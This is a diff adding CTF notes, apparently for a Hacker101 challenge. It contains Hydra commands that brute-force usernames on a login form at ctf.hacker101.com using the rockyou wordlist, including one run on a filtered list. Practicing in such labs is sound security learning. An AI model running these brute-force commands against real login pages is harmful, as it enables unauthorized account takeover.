@@ -41,3 +41,13 @@ cart=%5B%5B0%2C+%7B%22name%22%3A+%22Kitten%22%2C+%22desc%22%3A+%228%5C%22x10%5C%
 **Brute-forcing username/password with Hydra**
 
 
+>>> hydra -L /usr/share/wordlists/rockyou.txt -p idk -t 20 "" http-post-form "b02f939d67/login:username=^USER^&password=^PASS^:Invalid username" 
+>>> hydra -L /usr/share/wordlists/rockyou.txt -p idk -t 64 "http-post-form://124e8ef093d261d2c39b9fca373cb7f4.ctf.hacker101.com/login:username=^USER^&password=^PASS^:Invalid username"
+
+>>> cat /usr/share/wordlists/rockyou.txt| grep "sandy" > sandy.txt
+>>> hydra -L sandy.txt -p idk -t 20 "http-post-form://124e8ef093d261d2c39b9fca373cb7f4.ctf.hacker101.com/login:username=^USER^&password=^PASS^:Invalid username" 
+
+>>> https://1eedb2b48d94253d02181fb32793dca1.ctf.hacker101.com/login
+
+
+
